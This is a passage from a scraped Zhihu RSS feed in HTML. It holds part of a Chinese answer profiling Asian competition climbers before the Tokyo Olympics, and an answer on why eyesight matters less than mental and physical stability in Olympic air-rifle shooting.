src=\"https://pic3.zhimg.com/v2-2fcb9fbd06b4828bcd59ebcfcbbaafda_720w.jpg?rss\" data-caption=\"Miho Nonaka在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"463\" data-watermark=\"watermark\" data-original-src=\"v2-2fcb9fbd06b4828bcd59ebcfcbbaafda\" data-watermark-src=\"v2-ce96197fd0e3b257b3a7bbda6a06c6d0\" data-private-watermark-src=\"v2-06d4b7804cd10a398bec0a35cc653bca\"></p>\n<p>奥运遗珠：Futaba Ito</p>\n<p>Futaba是一位青少年选手——今年不过19岁。笔者从她16岁就开始关注了，是一位非常可爱的小姑娘。她一直是Akiyo的小跟班，其实也算是Akiyo的徒弟。相比Akiyo和Miho，Futaba多多少少有些稚气未脱，发挥时好时坏，在总成绩上比两位一姐二姐还是略显逊色。但是这两年随着成年，Futaba的力量也有了很大增长，整个人看上去大了一圈。等到Akiyo退役，相信Futaba通过也可以顺势上位，和Miho稳坐日本女队前两把交椅。不过日本年轻一代好手太多，也可能随着Akiyo的退役进入群雄割据的时代，未来如何就看Futaba自己的努力了。</p>\n<p><b>韩国队</b></p>\n<p><b>关键词：传承</b></p>\n<p>虽然比不上日本队可以对抗世界，但是韩国队绝对是亚洲范围乃至世界范围内的一支劲旅。其中有一个原因，是韩国队拥有全世界竞技攀岩第一人，或者说，世界攀联锦标赛成绩第一人，Jain Kim。是的，笔者在这里用了第一人这个词，并且没有加之一，没有限定性别。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-2fd41eb66bb1344dc65fd8ba0e9239ac_720w.jpg?rss\" data-caption=\"最优雅的岩者之一，Jain Kim。图源：ifsc\" data-size=\"normal\" data-rawwidth=\"2048\" data-rawheight=\"1638\" data-watermark=\"watermark\" data-original-src=\"v2-2fd41eb66bb1344dc65fd8ba0e9239ac\" data-watermark-src=\"v2-df376e60a73fba5a0c4454a3f0765391\" data-private-watermark-src=\"v2-4123e466184d054709a8b39646d45a2b\"></p>\n<p>Jain Kim在国际攀联世界杯共获得过多达三十次分站赛冠军，并且积分在2009年至2018之内从来没有掉出过世界前三，在2019/2013/2014获得过先锋攀登年度总冠军，在2010年和2015年获得过年度综合总冠军。这些成绩或许在未来会被人超越，比如Adam Ondra或者Janja Garnbret（时尚上Janja已经拥有了更多年度综合总冠军，但是在分站赛冠军数量上远远够不上Jain的级别。），但至少在目前Jain的成绩还是独霸天下。</p>\n<p>除开成绩这些冰冷的数字本身，Jain更为大家所知的，是她的攀爬技巧。几乎所有的岩友在刚开始接触攀岩的时候，都或多或少被告知要看Jain Kim的视频学习。Jain Kim技术动作丰富，攀爬节奏行云流水，脚点放置和手点抓握精准，无论从哪个角度来看都是教科书一般的存在，非常适合新手的学习。</p>\n<p>Jain和Akiyo同岁，在世界赛场上互相较量多年。早年Jain一直压制着Akiyo，直到近年来Akiyo开发出动态，以及世界比赛抱石定线风格越来越偏向跑酷风以后，Jain的风头才渐渐褪去。即便如此，在先锋攀登的比赛中，Jain仍然是稳定的决赛圈选手，并且还是可以力压群雄拿下冠军。只是Jain本身的风格并不动态，在现在的抱石比赛中非常吃亏，有的时候连半决赛都只能勉强进入，所以一定程度拖累了综合成绩。</p>\n<p>Jain也有奥运梦想，在年度积分上没有优势的她，决定冲击一下2020年亚洲锦标赛，因为2020年亚洲锦标赛的冠军还是可以获得一个奥运名额。然而造化弄人，因为新冠疫情，2020年亚洲锦标赛不得不取消，由于时间紧急，世界攀联选择了顺沿积分最高的选手递补，Jain遗憾无缘奥运。可喜的是，Jain在奥运希望破灭之后选择了和自己结婚多年的老公要了一个孩子，今年刚刚出生，一家人共享天伦之乐。笔者还是真诚地希望以后能在国际赛场上见到Jain，但是如果Jain就此退役，对她的人生也未必不是一件好事。</p>\n<p>有趣的是，世界攀联顺沿递补的一男一女两个奥运名额，都落在了韩国选手的囊中——男选手是Jong-won Chon，女选手则是Chae-hyun Seo。</p>\n<p>Chae-hyun Seo今年才十七岁，刚出道时被誉为韩国天才少女，而且她从小是看着Jain的比赛长大的，并且拥有一个叫“小Jain Kim”的外号。两人是忘年之交，也经常一起训练，Jain甚至也在第一时间把自己怀孕的消息跟Chae-hyun分享。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-5f884e7e75c1af6486c4bd8b66dfe225_720w.jpg?rss\" data-caption=\"Chae-hyun Seo在东京奥运会难度攀登比赛中。图源：东京奥运会官方微博\" data-size=\"normal\" data-rawwidth=\"690\" data-rawheight=\"457\" data-watermark=\"watermark\" data-original-src=\"v2-5f884e7e75c1af6486c4bd8b66dfe225\" data-watermark-src=\"v2-be9623cc33efa79c1c2492a22d9ae051\" data-private-watermark-src=\"v2-d592125a0e64349ae65ea672445d1513\"></p>\n<p>Chae-hyun在十四岁的时候拿下了户外5.14d（科罗拉多州的Bad Girls Club）的好成绩，震惊了全世界。在2019年刚刚适龄参加世界攀联锦标赛，就在六次先锋攀登比赛中拿下4金1银1铜的好成绩，力压Janja成为年度的先锋攀登冠军。Chae-hyun和Jain Kim技术风格类似，在抱石比赛中也没有很大优势，想要真正称霸世界还有一段路要走。</p>\n<p>另一名值得一提的韩国选手是男队的Jong-won Chon，同样也获得了奥运名额。相比其他精英男选手，Jong-won Chon本身非常偏瘦，BMI值甚至只有17点几，是营养不良的标准。但是Jong-won Chon最大的优势在于指力强劲，并且在2015年和2017年都拿到过抱石的年度总冠军，近年来也都是抱石比赛决赛圈的常客。笔者深刻怀疑Jong-won属于怎么吃都吃不胖的体型，因为他声称自己最爱吃的就是汉堡，并且称汉堡为“强者的食物”。奥运赛场上，Jong-won的竞争对手有很多，除开两位日本选手以外，捷克之王Adam Ondra无疑也是最大威胁。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-501e5729fef8ba657458d6aa3589a35b_720w.jpg?rss\" data-caption=\"Jong-won Chong在比赛中。可以看出，他的身材非常精瘦。图源：Gettyimages\" data-size=\"normal\" data-rawwidth=\"1024\" data-rawheight=\"904\" data-watermark=\"watermark\" data-original-src=\"v2-501e5729fef8ba657458d6aa3589a35b\" data-watermark-src=\"v2-36e39e004bc245fad2ab3753fca0c917\" data-private-watermark-src=\"v2-390070b72bf892baa945234c2c7fe5fd\"></p>\n<p>相比韩国女队，韩国男队的后备力量要相对薄弱一些，在韩国全国比赛中，只要Jong-won不打盹，抱石冠军绝对没跑，先锋决赛也是毫无悬念。在培养后继巨星方面，韩国男队还需要努力。</p>\n<p><b>中国队</b></p>\n<p><b>关键词：希望</b></p>\n<p>相比日本和韩国两国，中国队目前的实力无疑是比较薄弱的。这个情况跟往前四五十年的中国围棋情况非常相似：中国向日韩努力学习，尤其日本。</p>\n<p>抱石目前是中国队在国际赛场上最需要提高的一项。和日本队以及韩国队选手经常是世界攀联锦标赛决赛的常客不同，中国队的队员往往需要在预选赛中超水平发挥才可以进入半决赛，然而在半决赛中往往也处于后半梯队，很难争取到一个决赛名额。</p>\n<p>先锋攀登方面，中国队要好一些。攀岩入奥以后，国家开始重视，开始有意培养攀岩选手，攀岩也在人民群众中开始普及，作为地大物博的国家自然有天才少年出现。中国选手在先锋攀登的世界攀联锦标赛中，已经能比较稳定地锁定半决赛名额，而且也能经常在决赛看到我们中国选手的身影。</p>\n<p>下面这个表格是2019年世界攀联锦标赛先锋攀登比赛各个分站赛的决赛成员，包含男女组。其中的两位中国选手我用红色标记出来了。这里日本队仍然是绿色，韩国队使用蓝青色，我们可以再次看到日本队可怕的统治力，以及2019年韩国天才少女Chae-hyun在先锋攀登中的优异表现：</p>\n<p>IFSC Lead Finalist in 2019 - Men &amp; Women </p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c9ff3c27111d54fcda4a678b8659eb0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1105\" data-rawheight=\"587\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>在表格里面出现的这两位中国选手，就是我们国家自己的两位天才少年：潘愚非和张悦彤。其中，潘愚非成功拿到了奥运资格，张悦彤由于在预选赛后期遭遇伤病以及新冠疫情改制等原因无缘这次奥运。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4be21644e4af673c6b9d5976a9761aec_720w.jpg?rss\" data-caption=\"潘愚非在比赛中。\" data-size=\"normal\" data-rawwidth=\"1153\" data-rawheight=\"1729\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运选手：潘愚非</p>\n<p>笔者有一位在华南理工上大学的朋友。他在大学期间接触了攀岩，而且学校里就有攀岩馆，氛围非常好。而在攀岩馆内，爬得最好的并不是华南理工校队的成员，而是一位十岁的孩子——这位孩子，就是现在的潘愚非。</p>\n<p>潘愚非开始训练攀岩的理由，其实跟许多岩友有着相似之处。潘愚非从小体质弱，而且并不是很喜欢具有激烈身体对抗的体育活动，因此选择了攀岩。攀岩从来不是岩者跟岩者之间的较量，而永远是岩者跟岩壁之间的较量。潘愚非不断精进自己，改进自己的攀爬技术，补全自己的短板。</p>\n<p>在2017年的国际攀联锦标赛厦门站中，潘愚非就获得了男子先锋攀登的第三名，这是中国队第一次在先锋攀登站上领奖台。而在上图的2019年的国际攀联锦标赛Villars站中，潘愚非更是再一次取得了突破，获得了男子先锋攀登的第二名，并且锁定了一张奥运会入场券。这次奥运因为疫情延期，使得他更有机会能够继续锤炼自己，以求能在奥运赛场上取得更大的突破。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-7f7444793dd9a63e0e8d20bc2f900390_720w.jpg?rss\" data-caption=\"张悦彤在比赛中。\" data-size=\"normal\" data-rawwidth=\"1267\" data-rawheight=\"950\" data-watermark=\"\" data-original-src=\"\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p>奥运遗珠：张悦彤</p>\n<p>如果说韩国拥有自己的天才少女Chae-hyun Seo的话，那么我们中国也有自己的天才少女，张悦彤（彤彤）。</p>\n<p>彤彤在深圳出生长大，从小就开始学习攀岩。在2012年开始参加全国青年攀岩锦标赛，就拿下该年龄段的先锋和速度冠军，并且完成四连霸。尽管在国内已经战绩显赫，但是彤彤在2018年才真正站到国际赛场，参加了国际攀联世界青年锦标赛，在16-17岁组获得了抱石比赛第五名，先锋攀登第三名的好成绩，可谓是出道就是高起点，相比Chae-hyu那也不遑多让。接着在2019年彤彤就开始参加了成年组的比赛取得了一次亚军，一次第六名，和一次第七名的好成绩。尽管目前在成绩上相比韩国天才选手Chae-hyun，以及日本小将Natsuki Tanii稍逊，但是未来的路还很长，彤彤的前景也很光明，我们完全有理由相信这三位选手在未来在亚洲和世界赛场上大放异彩，成为中日韩女子攀岩界的一时瑜亮。很有趣的是，这三位女孩子的私交也非常好，可以看到Instagram上她们经常的互相留言点赞。相信随着未来越来越多的世界攀联比赛以及奥运比赛，我们能更多地看到她们一起出现在国际赛场上。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3bb4a10e3c0bcfaa668edd335cf19e08_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"597\" data-watermark=\"watermark\" data-original-src=\"v2-3bb4a10e3c0bcfaa668edd335cf19e08\" data-watermark-src=\"v2-3bd063b675312b8de5584fd4c8ff130b\" data-private-watermark-src=\"v2-7966abfc730a45b1d2b76f847d889f62\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-04a1bf0e8229b642e44aa87c76b4e74d_720w.jpg?rss\" data-caption=\"分别是Chae-hyun和彤彤在2019年国际攀联世界杯Briancon站之后的社交媒体截图。两位小姑娘私底下是很好的朋友，经常在社交媒体互动。\" data-size=\"normal\" data-rawwidth=\"934\" data-rawheight=\"599\" data-watermark=\"watermark\" data-original-src=\"v2-04a1bf0e8229b642e44aa87c76b4e74d\" data-watermark-src=\"v2-65825b16f90050585a2daa6e71bdba23\" data-private-watermark-src=\"v2-6e9ccb69962552faf569044c35272581\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/liang-wei-93-75?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">梁维</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">150 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/265963316?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">请问滑板,滑雪跟冲浪这3种运动在学习或者滑行时有什么共同点跟不同点呢？</a><br><a href=\"http://www.zhihu.com/question/20535362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">冲浪运动有哪些需要注意的地方？</a><br>\n","link":"http://www.zhihu.com/question/433842940/answer/2040348123?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"奥运神射手许海峰视力不足 0.5，张梦圆近视 600 度，近视也可以练射击吗？他们是如何看清靶子的？","date":"2021-08-04 06:30:10","description":"\n<p>对于射击运动来说，<b>视力远没有多数人想象的那么重要</b>。</p>\n<p>普通人无法看清的靶纸，<b>很多射击运动员同样无法看清</b>。</p>\n<p><br></p>\n<p>因为一来靶纸那么小、距离那么远，已经超过人类视力的极限。最后的结果是，大家都看的不是很清……二来即便存在“千里眼”看得清清楚楚，如果无法做到动作稳定、且心态平静的完成射击，依然无法实现目标。</p>\n<p>毕竟射击向来比的不是谁看的最准，甚至不是比谁射击的技术，而是<b>比谁心理更沉着，动作更「稳」。</b></p>\n<p>——所以射击选手花了大量的时间，都用来训练抗压能力/心理负荷和稳定性。包括所有射击项目用到的道具，射击服、射击鞋等，主要的作用也都是提高稳定性、降低干扰。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-c643d3516909f50d1d150d0d3f109ff5_720w.jpg?rss\" data-rawwidth=\"2070\" data-rawheight=\"1382\" data-size=\"normal\" data-caption=\"面部肌肉颤抖对气步枪射击而言是很要命的\" data-watermark=\"watermark\" data-original-src=\"v2-c643d3516909f50d1d150d0d3f109ff5\" data-watermark-src=\"v2-d22620a066be6bef3d56c20526e96c41\" data-private-watermark-src=\"v2-7912020596079aa8a2371c85c99c22ba\"></p>\n<p><br></p>\n<p>之前和射击队的聊过，其中两点记忆犹新。</p>\n<p>打气步枪射击的，别管平时表情多么搞怪面部动作丰富，射击时<b>控制面部肌肉颤抖的能力</b>相当重要（实际上很多身体的细微动作并不受主观控制，这是与生俱来的天赋）；</p>\n<p>另外别看射击运动员比赛中每个动作那么稳、甚至视觉上动作表现的很程序化很僵化，其实他们的身体动作非常柔和（笨重的射击服也限制了活动），射击运动员在所有奥运运动员里，可能具备最强的<b>姿势模仿能力</b>。</p>\n<p>这个姿势模仿能力，也是选拔潜力小射击运动员的重要标准之一。</p>\n<hr>\n<p>多放一些射击相关的设备和数据，对视力和射击这件事理解就能直观很多。</p>\n<p>也就能明白为什么说，<b>视力其实压根不是决定最终成绩的关键因素。</b></p>\n<p><br></p>\n<p>奥运射击分为两类，固定靶射击（气步枪、气手枪）和飞碟移动靶射击（双管霰弹枪）。固定靶射击里最短距离10米，固定射击位+固定靶纸。</p>\n<p>找了三张十米气步枪比赛的照片，注意距离十米远的靶纸上的黑点（很小）：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a61f8162d4b1bd096dc7942c67860ab5_720w.jpg?rss\" data-rawwidth=\"2068\" data-rawheight=\"1378\" data-size=\"normal\" data-caption=\"今年东京奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a61f8162d4b1bd096dc7942c67860ab5\" data-watermark-src=\"v2-04076c7997de43b7adac7cb13d7977ca\" data-private-watermark-src=\"v2-7885c1609907d9fbbc2c27fa1da5f846\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a4cb5aa17f6632d222c705317c8f7265_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1704\" data-size=\"normal\" data-caption=\"2016年里约奥运的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-a4cb5aa17f6632d222c705317c8f7265\" data-watermark-src=\"v2-3c02bed2538609bbf8e492d3681331c5\" data-private-watermark-src=\"v2-5f89e586b5334924063012f4185f2d8d\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9cac32d063d8374716ffab1c95267511_720w.jpg?rss\" data-rawwidth=\"2560\" data-rawheight=\"1549\" data-size=\"normal\" data-caption=\"2000年悉尼奥运会的十米气步枪\" data-watermark=\"watermark\" data-original-src=\"v2-9cac32d063d8374716ffab1c95267511\" data-watermark-src=\"v2-8469af387e0691cf35d4df11e2d637b8\" data-private-watermark-src=\"v2-7c6c8ebe760527eea40a0e92334fe7a0\"></p>\n<p><br></p>\n<p>照片里几乎看不清的黑点，长这样：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-eaf94c752fa453778bc1987930996d2c_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"600\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-eaf94c752fa453778bc1987930996d2c\" data-watermark-src=\"v2-8a2619bc981a92ee5f9f28bf32242672\" data-private-watermark-src=\"v2-a679d212cca1a4df698389a272e42f22\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-4175a56120392ec9877508723ef3af55_720w.jpg?rss\" data-rawwidth=\"1552\" data-rawheight=\"1076\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4175a56120392ec9877508723ef3af55\" data-watermark-src=\"v2-56b2fc38e9976aea65b0218e84a5226c\" data-private-watermark-src=\"v2-0256b89d60a6d5af0f2c05725943228c\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-40b7fe38af87ce013d3e0e91788901fa_720w.jpg?rss\" data-rawwidth=\"1286\" data-rawheight=\"316\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-40b7fe38af87ce013d3e0e91788901fa\" data-watermark-src=\"v2-cf37a8b562b4c4b203cbadafbb293093\" data-private-watermark-src=\"v2-6d8832082ddd19bedcbfd10c7c91d51e\"></p>\n<p>具体尺寸为：</p>\n<blockquote>总直径= 45.5mm； <br>4 环直径=30.5mm；<br>9 环直径=5.5mm； <br>10 环Ø=0.5mm；<br>划线宽度0.1mm至0.2mm</blockquote>\n<p><br></p>\n<p>就这么点大，且那么远。</p>\n<p><b>想要看清靶纸上的7～10环区，对人类的视觉而言几乎就已经是不可能的任务。</b></p>\n<p><b>而想靠眼睛去区分更细微的、能决定选手成绩的*.*环，更是完全天方夜谭。</b></p>\n<p>如果普通人有机会尝试一下10米气步枪射击，能打中靶纸，已经是相当不错的结果了。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-940b24ca888bd0b71925a8532d7c7a31_720w.jpg?rss\" data-rawwidth=\"1442\" data-rawheight=\"964\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-940b24ca888bd0b71925a8532d7c7a31\" data-watermark-src=\"v2-a0f9ebfc3f065605f3c0d5fa133b0cd0\" data-private-watermark-src=\"v2-63d079f33da8abcce3f15b691eec14ac\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2de532b30c98113a4747581ff6aad381_720w.jpg?rss\" data-rawwidth=\"600\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"这张仅供参考尺寸\" data-watermark=\"watermark\" data-original-src=\"v2-2de532b30c98113a4747581ff6aad381\" data-watermark-src=\"v2-ebb5e1269be41afeba9df52198af1c70\" data-private-watermark-src=\"v2-ce53ad360730d4edb0d7eb7f783a7a40\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-12f29d42fea4a50e6ffa1eff3e3f24a6_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"和奥运会使用的靶纸较为类似的装置。通过滚轴更换单次射击的靶纸。\" data-watermark=\"watermark\" data-original-src=\"v2-12f29d42fea4a50e6ffa1eff3e3f24a6\" data-watermark-src=\"v2-fcd2d8ae4234b037679cf38d7c50174c\" data-private-watermark-src=\"v2-0b8fbb17806fdc12eda7ffb7aef8f44b\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-4c918094ff8d050c877ffcd3f5c60dd8_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"932\" data-size=\"normal\" data-caption=\"相比之下，气手枪的靶纸就要比气步枪大得多。二者在射击器材、射击方式的精准性和稳定性上也有明显的差异\" data-watermark=\"watermark\" data-original-src=\"v2-4c918094ff8d050c877ffcd3f5c60dd8\" data-watermark-src=\"v2-7414622bcfa55c90c2b069f95cfda240\" data-private-watermark-src=\"v2-394c3ad916878ab9576b3d1413fa80a0\"></p>\n<p><br></p>\n<p>今年东京奥运会首金杨倩，女子十米气步枪，杨倩的最后一枪只有9.8环，发挥失常，她自己打完可能都以为冠军没戏了，然而俄罗斯的阿纳斯塔西娅·加拉希娜更是很失误的打了8.9环。最后一枪决出了胜负。</p>\n<p>杨倩：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-80e7e69eb62cae639ebbff4b94b3ef02_720w.jpg?rss\" data-rawwidth=\"1924\" data-rawheight=\"1014\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-80e7e69eb62cae639ebbff4b94b3ef02\" data-watermark-src=\"v2-91d717f99b06b47dd296b66129e4b9af\" data-private-watermark-src=\"v2-fd8ac62e4b3acfc5c111ebad8bb246d1\"></p>\n<p><br></p>\n<p>加拉希娜：</p>\n<p><img src=\"https://pic2.zhimg.com/v2-227d2e5d4cae9e943493edfb1ba2084c_720w.jpg?rss\" data-rawwidth=\"1922\" data-rawheight=\"1026\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-227d2e5d4cae9e943493edfb1ba2084c\" data-watermark-src=\"v2-f78e6f0a839bec800f4ce2eb795b7c2b\" data-private-watermark-src=\"v2-82b7c4c73680d5fca423ce4df88477ea\"></p>\n<p><br></p>\n<p>结合10米这个距离、这个小黑点，想象一下对她们而言大失水准的9.8环、8.9环，是什么概念。它们和各自最高的10.9环，位移的差异，又是怎样一个毫米数值。</p>\n<p>——<b>人类的视觉，精度完全没法达到这个水准。</b></p>\n<p>这种情况下，<b>视力度数的差异，影响也就没那么大了。</b></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-f1528de1e6d0c05c876c86a6368d4424_720w.jpg?rss\" data-rawwidth=\"700\" data-rawheight=\"467\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f1528de1e6d0c05c876c86a6368d4424\" data-watermark-src=\"v2-6895316fe5dab70083838d6a063a6a89\" data-private-watermark-src=\"v2-52f7b16b73412f8f182b84f3f8d8e55f\"></p>\n<p><br></p>\n<p>所以开头才说，视力无法成为决定最终射击成绩关键因素，<b>心理负荷的调节能力</b>和<b>技术动作的稳定性</b>，才是最最最重要的。</p>\n<p>很多人提到杨倩，都知道她是00后，最近还在热议她颁奖时的比心动作、美甲图案、清华学生身份……这个2000年7月出生的姑娘，2011年已经开始射击训练、2012年就参加比赛了。</p>\n<p>这整整十年的专业训练中，心理一直是需要伴随技术同步训练的内容。集中的志趣定向、超强的自控力、坚忍的意志品质、进取心……缺一不可。</p>\n<p>区别其他项目，射击运动员往往要更荣辱不惊一些，尤其是在参加大赛的多个项目中，不管第一项是夺冠还是失败，都要求选手能尽量恢复到平常心的状态进入另一项——就这种能力的考验而言，整个奥运会项目中也很难找到第二个了。</p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6dadc2607e9cea38ddec2d870cb72ea6_720w.jpg?rss\" data-rawwidth=\"1536\" data-rawheight=\"1025\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-6dadc2607e9cea38ddec2d870cb72ea6\" data-watermark-src=\"v2-43070ecdf793747cb5d1ffe9062e7d68\" data-private-watermark-src=\"v2-360575c880d0f6d3b0fd6bfd26172d1b\"></p>\n<p><br></p>\n<p>如今奥运会采用的淘汰制（得分最低者陆续被淘汰，最后冠亚军直接PK对决）在比赛观赏性上显然更紧张刺激，对选手的心理考验是极高的。</p>\n<p>因此，射击届也有一个默认的说法，<b>高手之间的竞争往往不是技术的竞争，而是一场无烟的心理战争。</b></p>\n<p><br></p>\n<p>技术动作的稳定性方面，射击选手也会进行大量的体能训练、力量训练。看起来“毫无训练痕迹”的射击运动员，他们在核心肌群的稳定性方面，要远超于普通人。</p>\n<p>关于稳定性有一个非常经典的测试（普通人也可以尝试一下）：</p>\n<p><b>光脚站在平整地面，单脚站立，另一只脚叠放脚背上或悬空，双臂平伸，闭上双眼，然后开始计时——普通人往往在20-60秒间，就无法保持平衡了。</b></p>\n<p>而杜丽之前曾透露过，<b>职业射击运动员能站数分钟甚至十几分钟。</b></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ac4c268082a1dbe8930b06391d3d58ba_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"643\" data-size=\"normal\" data-caption=\"同为十米气步枪选手，2004年拿到雅典奥运会首金的杜丽，如今已是2020年东京奥运会首金杨倩的教练之一\" data-watermark=\"watermark\" data-original-src=\"v2-ac4c268082a1dbe8930b06391d3d58ba\" data-watermark-src=\"v2-9503f92f82b8569d146e9a06b6f395a7\" data-private-watermark-src=\"v2-2f5508e617c5e708dfaf68dd396afc2c\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-ea534331a69079cd508510e5fa4e3bec_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"869\" data-size=\"normal\" data-caption=\"东京夺金后，庞伟的金牌数量也追平妻子杜丽。而庞伟从身型上看，也许也更接近普通人，属于“毫无训练痕迹”的那类。但他们的稳定性及心理素质，则远高于一般人\" data-watermark=\"watermark\" data-original-src=\"v2-ea534331a69079cd508510e5fa4e3bec\" data-watermark-src=\"v2-2676bc9b6a21e63f656e728456f249c1\" data-private-watermark-src=\"v2-4aefb4704a58519f87910e3d46893764\"></p>\n<p><br></p>\n<p>所以心理负荷的控制能力、技术动作和身体的稳定能力，这些都要远远比视力重要。</p>\n<p>和普通人视力水平相似的射击选手之所以做到机器般的精准度，用卖油翁的话来说，</p>\n<p>“无它，唯手熟尔。”</p>\n<hr>\n<p>最后多提一下气步枪射击的装备——</p>\n<p><br></p>\n<p>因为射击器械、射击姿势的不同，气手枪和气步枪的装备差异极大。</p>\n<p>气手枪往往穿着较为舒适、日常运动的服装即可，也不允许借助外界装备来提高射击时的稳定性。而气步枪则全副武装、如同戴了一副盔甲一样：</p>\n<p><img src=\"https://pic4.zhimg.com/v2-7e4ea6eb5560e511a356b3558519b261_720w.jpg?rss\" data-rawwidth=\"1199\" data-rawheight=\"820\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e4ea6eb5560e511a356b3558519b261\" data-watermark-src=\"v2-9ccddc00b2cf6ca8783129292865bdce\" data-private-watermark-src=\"v2-0a5285fd59918eefa14727c3b2932cb8\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f36277de0652d5801ffa10c472bd20ff_720w.jpg?rss\" data-rawwidth=\"2158\" data-rawheight=\"1216\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-f36277de0652d5801ffa10c472bd20ff\" data-watermark-src=\"v2-a86080cb9806ed90c35f56b2e020eba4\" data-private-watermark-src=\"v2-110569dc2dcce28b75abd2149a0a3680\"></p>\n<p><br></p>\n<p>气步枪的射击服，用盔甲形容真不为过。一般用料包括两层厚帆布外加皮革，因此过去的射击服，重量和厚度都相当的惊人，5+公斤是常态。2004年雅典奥运会后，世界射击联合会（issf）对装备有过调整，稍微轻薄了一些。</p>\n<p>专业选手的射击服都是量身定做、专人专制的，<b>整个测量的繁琐程度，远超过很多高级定制西装的规格。</b></p>\n<p>非职业射击训练者，采购专业射击服时如果无法像职业选手那样测量，也需要填写相当繁琐的身体数据，最终的射击服才能勉强一用。</p>\n<p>——就算两个选手身高体重一样，看起来粗粗大大的射击服依然不能换着穿。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9d1ddd68ec017ff6b15eb4df07cf773a_720w.gif?rss\" data-rawwidth=\"555\" data-rawheight=\"300\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9d1ddd68ec017ff6b15eb4df07cf773a\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<p><br></p>\n<p>射击服的所有功能设计，也为达到射击过程中<b>完美的稳定性</b>，以及<b>尽可能杜绝一切外界的、选手自身的干扰</b>，并且<b>对颈椎、腰背等部位起到保护和预防慢性伤病</b>的作用。</p>\n<p>其中选手自身的干扰，就包括因为心脏跳动引起的、和呼吸起伏时身体出现的晃动——结合上面射击成绩和靶纸尺寸，想象一下心跳、呼吸等日常毫无存在感的生理动作，都会极大影响射击的精准度。</p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-8f2115d5f6c2b5aaaa7635cc12dda9bd_720w.jpg?rss\" data-rawwidth=\"2074\" data-rawheight=\"1392\" data-size=\"normal\" data-caption=\"与视觉上的粗矿不同，实际射击服对细节精度、功能要求都极高，是技术含量很高的专业定制化装备\" 